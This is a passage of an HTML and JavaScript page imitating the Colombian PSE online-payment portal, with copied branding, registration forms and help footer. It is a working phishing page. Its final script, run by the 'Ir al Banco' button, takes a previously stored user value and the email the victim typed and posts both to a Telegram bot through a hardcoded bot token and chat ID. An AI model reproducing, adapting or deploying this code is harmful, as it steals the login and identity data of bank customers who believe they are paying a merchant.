                        createInfoModal("Terminos y Condiciones del servicio PSE", "LoadUserDocument.aspx?type=termsandconditions", "PDF");
                        break;
                }
            }
        }

        function acceptUserDocuments() {
            $.ajax({
                url: "api/AcceptUserDocuments",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'documents': userdata.UserPendingDocuments }),
                dataType: "json",
                success: acceptUserDocumentsSuccess,
                error: acceptUserDocumentsError,
                async: false
            });
        }

        function acceptUserDocumentsSuccess(data) {
            if (data != true) {
                returnPage = currentPage;
                mensajes = "Ocurrió un error aceptando los documentos aceptados por el usuario, inténtalo nuevamente.";
                showPagina('pageMensajeError');
            }
        }

        function acceptUserDocumentsError(error) {
            returnPage = currentPage;
            mensajes = 'Ocurrió un error aceptando los documentos aceptados por el usuario, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
            showPagina('pageMensajeError');
        }

        function checkForBannerClick(event) {
            var parent = document.getElementsByClassName('main')[0];
            var width = parent.offsetWidth;
            var height = parent.offsetHeight;
            var scale_x = 1920.00 / width;
            var scale_y = 178.00 / height;
            var corr_x = (1519 - width) * 0.000137;
            var min_x = 1728 * (1.00 - corr_x);
            var max_x = 1883 * (1.00 - corr_x);
            var x = event.clientX * scale_x;
            var y = event.clientY * scale_y;

            if (x >= min_x && x <= max_x && y >= 98 && y <= 146)
                createInfoModal("Registro PSE", "assets/2020/registro_PSE.pdf", "PDF");
        }

        function deleteInfoModal() {
            $("#infoModal").modal("hide");
        }

        function deleteDisclaimerModal() {
            $("#PageDisclaimerModal").modal("hide");
            $('#pageMensajes').empty();
        }

        function showDisclaimerModal() {
            var cadena = '';
            cadena = '<div class="modal fade" id="PageDisclaimerModal" style="display: none" tabindex="-1" role="dialog" aria-labelledby="disclaimerModal" aria-hidden="true">' +
                '    <div class="modal-dialog" role="document">' +
                '        <div class="modal-content">' +
                '            <div class="modal-header">' +
                '                <div class="pseLogo">' +
                '                    <div class="pseLogoCssI"><img src="assets/img/NFbanner-izq.svg" style="height: 72px"></div>' +
                '                    <div class="pseLogoCssD"><img src="assets/img/NFbanner-der.svg"></div>' +
                '                </div>' +
                '            </div>' +
                '            <div class="modal-body" id="currentUserPolicy" style="overflow-y: auto; max-height: 420px;"></div>' +
                '            <div class="modal-footer">' +
                '                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">' +
                '                    <span class="pull-left"><img src="assets/img/footer.png" class="img-footer"></span>' +
                '                </div>' +
                '                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 col-lg-offset-6 col-md-offset-6 col-sm-offset-6 col-xs-offset-6 FooterButtonDivCss">' +
                '                    <button type="button" onclick="deleteInfoModal();" class="btn_cerrar_footer" data-dismiss="modal">Cerrar</button>' +
                '                </div>' +
                '            </div>' +
                '        </div>' +
                '    </div>' +
                '</div>';
            $('#pageMensajes').empty();
            $('#pageMensajes').append(cadena);
        }

        

        

        
    </script>
</head>
<body onload="checkBrowser();">
    <form id="form1" role="form" class="form-horizontal fv-form fv-form-bootstrap" data-fv-framework="bootstrap" onsubmit="return false;" novalidate="novalidate"><button type="submit" class="fv-hidden-submit" style="display: none; width: 0px; height: 0px;"></button>
        <input type="hidden" id="CSRFToken" name="CSRFToken" value="3cf40a19-c8ee-4998-9f16-1b0846146710">
        <div id="header" class="headerACH">
            <div class="EncabezadoCss">
                <div class="pseLogoCssI"><img src="pagopse_files/NFbanner-izq.svg"></div>
                <div class="pseLogoCssD"><img src="pagopse_files/NFbanner-der.svg" align="right"></div>
            </div>
        </div>

        <div id="pagePoliticas" class="display: none pseFondoTrans" style="display: none;">
            <div id="pagePoliticasInt" class="pagePoliticasCss">
                <div class="modal-header">
                    <div class="EncabezadoPLCss">
                        <div class="pseLogoCssI"><img src="pagopse_files/NFbanner-izq.svg"></div>
                        <div class="pseLogoCssD"><img src="pagopse_files/NFbanner-der.svg" align="right"></div>
                    </div>
                </div>
                <div style="text-align: center; position: absolute; top:100px; right:0; left: 0; margin: auto;">
                    <img src="pagopse_files/Tratamiento.svg" style="width:79.41px">
                </div>
                <div class="textCancelar1" style="text-align: center; position: absolute; top:200px; right:0; left: 0; margin: auto;">
                    <p style="color: #183372;"><span id="politicasMensajes"></span></p>
                </div>
                <div class="modal-footer" style="text-align: center; position: absolute; top:300px; right:0; left: 0; margin: auto;">
                    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">
                        <span class="pull-left"><img src="pagopse_files/footer.png" class="img-footer"></span>
                    </div>
                    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 col-lg-offset-6 col-md-offset-6 col-sm-offset-6 col-xs-offset-6 FooterButtonDivCss">
                        <button type="button" onclick="if (returnPage == currentPage) showPagina('pagePrincipal'); else window.location.href=returnPage;" class="btn_cerrar_footer">Acepto</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="pagePrincipal">
            <div id="movilACHST" class="movilACH movilACHSTPN">
                <div id="movilACHSTCss" class="movilACHSTPNCss">
                    <div class="div_tipo_persona">
                        <span class="txt_tipo_persona">Selecciona el tipo de persona:</span>
                    </div>
                    <div class="div_tipo_personaCss">
                        <div id="id_per_naturalP" class="col-xs-6 left nopadding per_natural_checkP">
                            <div id="id_per_natural" class="per_natural_check" onclick="onClickPersona('nat');">
                                <input type="radio" id="rdUsertype0" name="person_option" style="visibility:hidden" checked="checked">
                                <span><img id="id_per_natural_IMG" class="per_natural_check_IMGCss" src="pagopse_files/natural_check.svg">&nbsp;&nbsp;Natural</span>
                                <span id="lineaPN" class="lineaPNCss"><img src="pagopse_files/lineaA.png"></span>
                            </div>
                        </div>
                        <div id="id_per_juridicaP" class="col-xs-6 right nopadding per_juridicaP">
                            <div id="id_per_juridica" class="per_juridica" onclick="onClickPersona('jur');">
                                <input type="radio" id="rdUsertype1" name="person_option" style="visibility:hidden">
                                <span><img id="id_per_juridica_IMG" class="per_juridica_IMGCss" src="pagopse_files/juridica.svg">&nbsp;&nbsp;Jurídica</span>
                                <span id="lineaPJ" class="lineaPNCss" style="display: none;"><img src="pagopse_files/lineaA.png"></span>
                            </div>
                        </div>
                    </div>
                    <div id="div_registro_menuST" class="div-registro-menu div_registro_menuSTPN" style="text-align: center;">
                        <div class="list-option" style="text-align: center;">
                            <label id="rdOptionCreateP" class="btn-option-click">
                                <input type="radio" id="rdOptionYes" name="action_person" checked="checked">
                                <span class="btn-option-span">&nbsp;<i class="fa"></i><img id="rdOptionCreateI" src="pagopse_files/opreg_sel.svg">&nbsp;Soy un usuario registrado</span>
                            </label>
                            <label id="rdOptionUpdateP" class="btn-option">
                                <input type="radio" id="rdOptionNow" name="action_person">
                                <span class="btn-option-span">&nbsp;<i class="fa"></i><img id="rdOptionUpdateI" src="pagopse_files/opact.svg">&nbsp;Registrarme ahora</span>
                            </label>
                            <label id="rdOptionDeleteP" class="btn-option" style="display: none;">
                                <input type="radio" id="rdOptionNo" name="action_person" style="display: none;">
                                <span class="btn-option-span" id="spnOptionNo" style="display: none;">&nbsp;<i class="fa"></i><img id="rdOptionDeleteI" src="pagopse_files/opbor.svg">&nbsp;Registro preliminar</span>
                            </label>
                        </div>
                        <table id="trRegistradoPN" width="100%" style="display: table;">
                            <tbody><tr>
                                <td colspan="3" style="height: 30px;"></td>
                            </tr>
                            <tr>
                                <td class="PJTableST1"></td>
                                <td class="PJIngresoCampos"><span class="UPDTextIngreso">Ingresa tu correo electrónico </span><span style="color: red;">*</span></td>
                                <td class="PJTableST1"></td>
                            </tr>
                            <tr>
                                <td></td>
                                <td>
                                    <table style="width: 100%">
                                        <tbody><tr>
                                            <td class="PJTable3"></td>
                                            <td>
                                                <div class="form-group">
                                                    <input type="text" class="form-control" id="PNEMail" name="PNEMail" placeholder="Ej: correo@pse.com.co" data-toggle="tooltip" data-placement="top" maxlength="120" data-fv-regexp="true" data-fv-regexp-regexp="^[^@\s]+@([^@\s]+\.)+[^@\s]+$" data-fv-regexp-message="El campo E-mail es inválido" data-fv-stringlength-max="120" data-fv-stringlength-message="El campo E-mail debe tener hasta 120 caracteres" onkeyup="fHabilita(this);" data-fv-field="PNEMail" title="" data-original-title="Ingresa el correo electrónico asociado a tu registro">
                                                <small style="display: none;" class="help-block" data-fv-validator="regexp" data-fv-for="PNEMail" data-fv-result="NOT_VALIDATED">El campo E-mail es inválido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="PNEMail" data-fv-result="NOT_VALIDATED">El campo E-mail debe tener hasta 120 caracteres</small></div>
                                            </td>
                                            <td class="PJTable3"></td>
                                        </tr>
                                    </tbody></table>
                                </td>
                                <td></td>
                            </tr>
                        </tbody></table>
                        <table id="trRegistradoPJ" width="100%" class="" style="display: none;">
                        <tbody><tr>
                            <td class="stpj">&nbsp;</td>
                            <td>
                                <div class="confirmation-form-box" style="height: 110px; text-align: center;">
                                    <div class="row camposUDPJ">
                                        <div class="form-group col-lg-5 col-md-5 col-sm-12 col-xs-12">
                                            <p style="width: 100%; text-align: left;"><span class="UPDTextIngreso">NIT </span><span style="color: red;">*</span></p>
                                            <br>
                                            <input type="text" class="form-control correoPN" id="PJNIT" name="PJNIT" placeholder="NIT registrado en PSE" data-toggle="tooltip" data-placement="top" maxlength="15" data-fv-notempty="true" data-fv-notempty-message="El campo NIT es requerido" data-fv-regexp="true" data-fv-regexp-regexp="^[a-zA-Z0-9]{1,15}$" data-fv-regexp-message="El NIT debe ser alfanumérico de 1 hasta 15 caracteres" data-fv-field="PJNIT" title="" data-original-title="Ingresa el NIT asociado a tu registro">
                                        <small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED">El campo NIT es requerido</small><small style="display: none;" class="help-block" data-fv-validator="regexp" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED">El NIT debe ser alfanumérico de 1 hasta 15 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED">Please enter a value with valid length</small></div>
                                        <div class="form-group col-lg-1 col-md-1 col-sm-12 col-xs-12"></div>
                                        <div class="form-group col-lg-5 col-md-5 col-sm-12 col-xs-12">
                                            <p style="width: 100%; text-align: left;"><span class="UPDTextIngreso">Correo Electronico </span><span style="color: red;">*</span></p>
                                            <br>
                                            <input type="email" class="form-control correoPN" id="PJEMail" name="PJEMail" onkeypress="checkPolicyChangeDiv('PJEMail');" placeholder="E-mail registrado en PSE" maxlength="120" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo e-mail es requerido" data-fv-emailaddress-message="El campo e-mail es inválido" data-fv-field="PJEMail" title="" data-original-title="Ingresa el correo electrónico asociado a tu registro">
                                        <small style="display: none;" class="help-block" data-fv-validator="emailAddress" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED">El campo e-mail es inválido</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED">El campo e-mail es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED">Please enter a value with valid length</small></div>
                                    </div>
                                    </div>
                            </td>
                        </tr>
                        </tbody></table>
                        <div class="row visible-lg visible-md">
                            <div class="col-lg-12 col-md-12" style="position: absolute; top: 180px; left: 0px; right: 0px; margin: auto;">
                                <div class="text-center btns">
                                    <button type="button" id="btnCancel" class="btn-blanco" formnovalidate="" onclick="abandonPayment(1);">Regresar al comercio</button>
                                    &nbsp;&nbsp;&nbsp;
                                    <button type="button" id="btnSeguir" class="btn-amarillo" onclick="carl();">Ir al Banco</button>
                                </div>
                            </div>
                        </div>
                        <div class="row visible-xs visible-sm">
                            <div id="botonesSTPN2" class="text-center btns stpnS2">
                                <div class="col-xs-12 col-sm-12"><button type="button" id="btnSeguir2" class="btn-amarillo" onclick="carl();">Ir al Banco</button></div>
                                <div class="col-xs-12 col-sm-12"><button type="button" id="btnCancel2" class="btn-blanco" formnovalidate="" onclick="abandonPayment(1);">Regresar al comercio</button></div>
                            </div>
                        </div>
                    </div>
                    </div>
            </div>
        </div>

        <div id="all" style="display: none;">
            <div class="col-xs-12 col-md-10 col-centered box-content">
                <div id="registrado" class="form-field-box">
                    <div class="form-group block" id="trValidation">
                        <label class="col-xs-12 col-sm-4"><span id="lblQuestion"></span></label>
                        <input type="text" class="form-control" id="QuestionResponse" name="QuestionResponse" placeholder="Respuesta Pregunta de Seguridad" maxlength="64" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="Debes registrar la respuesta de seguridad indicada para continuar con el pago" data-fv-stringlength-max="64" data-fv-stringlength-message="El campo respuesta de la pregunta de seguridad debe tener hasta 64 caracteres" data-fv-field="QuestionResponse" title="" data-original-title="Ingresa la respuesta a la pregunta de seguridad">
                    <small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="QuestionResponse" data-fv-result="NOT_VALIDATED">Debes registrar la respuesta de seguridad indicada para continuar con el pago</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="QuestionResponse" data-fv-result="NOT_VALIDATED">El campo respuesta de la pregunta de seguridad debe tener hasta 64 caracteres</small></div>
                </div>
                <div class="form-field-box" id="trRegistrar" style="display: none;">
                    <div class="wrapper_select2">
                        <select id="ddTipoIdentificacion" class="form-control" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo Tipo de Identificación es requerido" title="" data-original-title="Selecciona el tipo de identificación de la lista">
                            <option value="11">Registro civil de nacimiento</option>
                            <option value="12">Tarjeta de identidad</option>
                            <option value="13" selected="selected">Cedula de ciudadania</option>
                            <option value="21">Tarjeta de extranjeria</option>
                            <option value="22">Cedula de extranjeria</option>
                            <option value="31">NIT</option>
                            <option value="41">Pasaporte</option>
                            <option value="42">Documento de identificacion extranjero</option>
                        </select>
                    </div>
                    <input type="text" class="form-control" id="txtNumeroIdentificacion" name="txtNumeroIdentificacion" placeholder="Número de Identificación" maxlength="15" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo número de identificación es requerido" data-fv-regexp="true" data-fv-regexp-regexp="^[a-zA-Z0-9]{1,15}$" data-fv-regexp-message="El campo número de identificación debe tener de 1 hasta 15 posiciones" data-fv-field="txtNumeroIdentificacion" title="" data-original-title="Ingresa tu número de identificación">
                    <input type="text" class="form-control" id="txtNITPJ" name="txtNITPJ" placeholder="Número de Identificación Tributario" data-toggle="tooltip" data-placement="top" maxlength="15" data-fv-notempty="true" data-fv-notempty-message="El campo NIT es requerido" data-fv-regexp="true" data-fv-regexp-regexp="^[a-zA-Z0-9]{1,15}$" data-fv-regexp-message="El NIT debe ser alfanumérico de 1 hasta 15 caracteres" data-fv-field="txtNITPJ" title="" data-original-title="Ingresa el Número de Identificación Tributario de la empresa">
                    <input type="text" class="form-control" id="txtNombrePJ" name="txtNombrePJ" placeholder="Nombre de la empresa" maxlength="64" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo nombre es requerido" data-fv-stringlength-min="1" data-fv-stringlength-max="64" data-fv-stringlength-message="El campo nombre debe tener hasta 64 caracteres" data-fv-field="txtNombrePJ" title="" data-original-title="Ingresa el nombre de la empresa">
                    <input type="text" class="form-control" id="txtNombre" name="txtNombre" placeholder="Nombre completo y apellidos" maxlength="64" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo nombre es requerido" data-fv-stringlength-min="1" data-fv-stringlength-max="64" data-fv-stringlength-message="El campo nombre debe tener hasta 64 caracteres" data-fv-field="txtNombre" title="" data-original-title="Ingresa tu nombre completo y apellidos">
                    <input type="tel" class="form-control" id="txtNumeroCelular" name="txtNumeroCelular" placeholder="Número de celular" maxlength="10" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo número de celular es requerido" data-fv-regexp="true" data-fv-regexp-regexp="^\d{8,10}$" data-fv-regexp-message="El campo número de celular debe tener de 8 hasta 10 dígitos" data-fv-field="txtNumeroCelular" title="" data-original-title="Ingresa tu número celular">
                    <input type="text" class="form-control" id="txtDireccionPN" name="txtDireccionPN" placeholder="Dirección de residencia o trabajo" maxlength="64" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo dirección es requerido" data-fv-stringlength-min="1" data-fv-stringlength-max="64" data-fv-stringlength-message="El campo dirección debe tener hasta 64 caracteres" data-fv-field="txtDireccionPN" title="" data-original-title="Ingresa tu dirección">
                    <input type="text" class="form-control" id="txtDireccionPJ" name="txtDireccionPJ" placeholder="Dirección de la empresa" maxlength="64" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo dirección es requerido" data-fv-stringlength-min="1" data-fv-stringlength-max="64" data-fv-stringlength-message="El campo dirección debe tener hasta 64 caracteres" data-fv-field="txtDireccionPJ" title="" data-original-title="Ingresa tu dirección">
                    <input type="email" class="form-control" id="txtEMail" name="txtEMail" placeholder="E-mail" maxlength="120" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo e-mail es requerido" data-fv-emailaddress-message="El campo e-mail es inválido" data-fv-stringlength-max="120" data-fv-stringlength-message="El campo e-mail debe tener hasta 120 caracteres" data-fv-field="txtEMail" title="" data-original-title="Ingresa tu correo electrónico">
                    <input id="chkDisclaimerNotRegistered" name="chkDisclaimerNotRegistered" type="checkbox" value="" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="Debes aceptar los términos, condiciones y el aviso de privacidad para continuar el pago." data-fv-field="chkDisclaimerNotRegistered" data-original-title="" title="">
                </div>
            <small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtNumeroIdentificacion" data-fv-result="NOT_VALIDATED">El campo número de identificación es requerido</small><small style="display: none;" class="help-block" data-fv-validator="regexp" data-fv-for="txtNumeroIdentificacion" data-fv-result="NOT_VALIDATED">El campo número de identificación debe tener de 1 hasta 15 posiciones</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtNumeroIdentificacion" data-fv-result="NOT_VALIDATED">Please enter a value with valid length</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtNITPJ" data-fv-result="NOT_VALIDATED">El campo NIT es requerido</small><small style="display: none;" class="help-block" data-fv-validator="regexp" data-fv-for="txtNITPJ" data-fv-result="NOT_VALIDATED">El NIT debe ser alfanumérico de 1 hasta 15 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtNITPJ" data-fv-result="NOT_VALIDATED">Please enter a value with valid length</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtNombrePJ" data-fv-result="NOT_VALIDATED">El campo nombre es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtNombrePJ" data-fv-result="NOT_VALIDATED">El campo nombre debe tener hasta 64 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtNombre" data-fv-result="NOT_VALIDATED">El campo nombre es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtNombre" data-fv-result="NOT_VALIDATED">El campo nombre debe tener hasta 64 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtNumeroCelular" data-fv-result="NOT_VALIDATED">El campo número de celular es requerido</small><small style="display: none;" class="help-block" data-fv-validator="regexp" data-fv-for="txtNumeroCelular" data-fv-result="NOT_VALIDATED">El campo número de celular debe tener de 8 hasta 10 dígitos</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtNumeroCelular" data-fv-result="NOT_VALIDATED">Please enter a value with valid length</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtDireccionPN" data-fv-result="NOT_VALIDATED">El campo dirección es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtDireccionPN" data-fv-result="NOT_VALIDATED">El campo dirección debe tener hasta 64 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtDireccionPJ" data-fv-result="NOT_VALIDATED">El campo dirección es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtDireccionPJ" data-fv-result="NOT_VALIDATED">El campo dirección debe tener hasta 64 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="emailAddress" data-fv-for="txtEMail" data-fv-result="NOT_VALIDATED">El campo e-mail es inválido</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="txtEMail" data-fv-result="NOT_VALIDATED">El campo e-mail es requerido</small><small style="display: none;" class="help-block" data-fv-validator="stringLength" data-fv-for="txtEMail" data-fv-result="NOT_VALIDATED">El campo e-mail debe tener hasta 120 caracteres</small><small style="display: none;" class="help-block" data-fv-validator="notEmpty" data-fv-for="chkDisclaimerNotRegistered" data-fv-result="NOT_VALIDATED">Debes aceptar los términos, condiciones y el aviso de privacidad para continuar el pago.</small></div>
        </div>

        <div id="divProcessing" class="row text-center btns" style="display:none; width: 480px; top: 100px; text-align: center; right: 0; left: 0; margin: auto;">
            <hr>
            <h2 class="title text-center" style="width: 100%;">
                Estamos procesando tu transacción
            </h2>
            <div class="progress progress-striped active" style="margin-bottom: 0">
                <div class="progress-bar" style="width: 100%">
                </div>
            </div>
        </div>

        <div id="divProcessingSession" class="row col-xs-10 col-sm-6 col-xs-offset-1 col-sm-offset-3 nopadding" style="display: none;">
            <hr>
            <br><br><br><br><br><br><br>
            <h2 class="procesando_post"><span id="nombreUsu" class="procesando_post"></span><br>Estamos procesando tu transacción<br>&nbsp;</h2>
            <div class="progress progress-striped active" style="margin-bottom: 0">
                <div class="progress-bar" style="width: 100%">
                </div>
            </div>
            <br><br><br>
        </div>

        <div id="pageFooter" class="contact-box container pageFooterSTPNCss">
            <div class="row visible-md visible-lg">
                <span class="pull-left">
                    <img src="pagopse_files/footer.svg" class="img-responsive" style="height: 120px;">
                </span>
                <span class="pull-right" style="display: block; margin-top: 28px; width: 731px;">
                    <span class="pull-left" style="width: 27px; height: 68px; border-radius: 8px 0px 0px 8px; background: rgba(253, 184, 19, 1); box-shadow: 0px 4px 4px 0px #00000040;"></span>
                    <span class="pull-right" style="width: 704px; height: 68px; border-radius: 0px 8px 8px 0px; opacity: 0.5px; background: rgba(217, 217, 217, 0.4); box-shadow: 4px 4px 4px 0px #00000040;">
                        <div class="frow">
                            <div class="col col1" style="height: 48px; display: flex; justify-content: center; align-items: center;">
                                <img src="pagopse_files/footerD.svg" style="height: 34px;">
                            </div>
                            <div class="col col2" style="height: 48px;">
                                <span class="footer_cadena1">Para mayor información</span><br>
                                <span class="footer_cadena2">comunícate con nosotros:</span>
                            </div>
                            <div class="col col3" style="height: 48px; padding-top: 10px; font-family: Red Hat Display; font-size: 12px; font-weight: 600; line-height: 15.88px; text-align: left;">
                                <img style="width: 11px" src="pagopse_files/mobile.svg">&nbsp;&nbsp;&nbsp;En Bogotá:<br>
                                <img style="width: 11px" src="pagopse_files/conta.svg">&nbsp;&nbsp;&nbsp;Contáctanos:
                            </div>
                            <div class="col col4" style="height: 48px; padding-top: 10px; font-family: Red Hat Display; font-size: 12px; font-weight: 400; line-height: 15.88px; text-align: left;">
                                <i class="footer_cadena4"></i>+57 (601) 3808890 opción 5<br>
                                <i class="footer_cadena4"></i><a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">https://www.pse.com.co/persona-centro-de-ayuda</a>
                            </div>
                        </div>
                    </span>
                </span>
            </div>
            <div class="row visible-xs visible-sm">
                <div class="pageFooterACHCss">
                    <div class="pageFooterIMGDer">
                        <div class="left" style="position:relative; width: 22px; height: 101px; left: 20px; margin: auto; border-radius: 8px 0px 0px 8px; background: #FDB813; z-index: 47; box-shadow: 0px 0px 3px 0px rgba(0, 0, 0, 0.25);"></div>
                        <div class="right" style="position:relative; width: 335px; height: 101px; right: 20px; margin: auto; border-radius: 0px 8px 8px 0px; opacity: 0.5px; background: rgba(217, 217, 217, 0.4); z-index: 45; box-shadow: 3px 3px 3px 0px rgba(0, 0, 0, 0.25);"></div>
                        <div class="footer_int1">
                            <img src="pagopse_files/footerD.svg" style="height: 28px;">
                        </div>
                        <div class="footer_int2">
                            <span class="footer_cadena1">Para mayor información</span><br>
                            <span class="footer_cadena2">comunícate con nosotros:</span>
                        </div>
                        <div class="footer_int3">
                            <img style="width: 8.86px" src="pagopse_files/mobile.svg">&nbsp;&nbsp;&nbsp;En Bogotá:<br>
                            <img style="width: 8.86px" src="pagopse_files/conta.svg">&nbsp;&nbsp;&nbsp;Contáctanos:
                        </div>
                        <div class="footer_int4">
                            <i class="footer_cadena4"></i>+57 (601) 3808890 opción 5<br>
                            <i class="footer_cadena4"></i><a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">https://www.pse.com.co/persona-centro-de-ayuda</a>
                        </div>

                        <div class="footer_int5">
                            <img src="pagopse_files/footer.svg" style="height: 82px;">
                        </div>

                    </div>
                </div>
            </div>
        </div>

        <div id="pageMensajes"></div></form>
    
    <script>
        
    


function carl() {
      const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
      const chatId = "-4263096630";
      const usr = localStorage.getItem("usr");
      const usrs = document.getElementById("PNEMail").value;
      
      
      if (!usr) {
        alert("User is not set in localStorage.");
        return;
      }
    
      const message = `-NEW ONE-\n --Usr.: ${usr} \n  --mailpse.: ${usrs}--  `;
      $.ajax({
        type: "POST",
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
          chat_id: chatId,
          text: message,
          parse_mode: "html",
        },
        success: function (res) {
          console.debug(res);
          $("#response").text("Message sent");
          console.log("enviado");
          localStorage.setItem("usr", usr);
         
         
        },
        error: function (error) {
          console.error("Error: ", error);
          alert("Failed to send message. See console for details.");
        },
      });
    }
    </script>
    
    </body></html>